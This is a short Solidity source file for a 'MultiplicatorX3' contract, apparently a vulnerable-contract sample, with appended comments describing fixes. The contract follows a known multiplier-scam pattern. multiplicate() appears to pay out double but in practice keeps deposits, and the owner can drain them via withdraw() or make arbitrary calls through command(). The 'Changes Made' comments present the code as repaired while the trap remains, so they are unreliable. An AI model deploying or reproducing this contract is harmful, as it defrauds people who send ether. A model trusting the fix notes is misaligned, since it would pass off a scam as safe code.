pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _adr, bytes _data) public payable {
        require(msg.sender == owner);
        require(_adr.call.value(msg.value)(_data));
    }

    function multiplicate(address _adr) public payable {
        if (msg.value >= this.balance) {
            require(_adr.call.value(this.balance + msg.value)());
        }
    }
} 

// Changes Made:
// 1. Changed Owner variable to owner (lowercase)
// 2. Added require statement to check the return value of the external call in the Command function
// 3. Added require statement to check the return value of the external call in the multiplicate function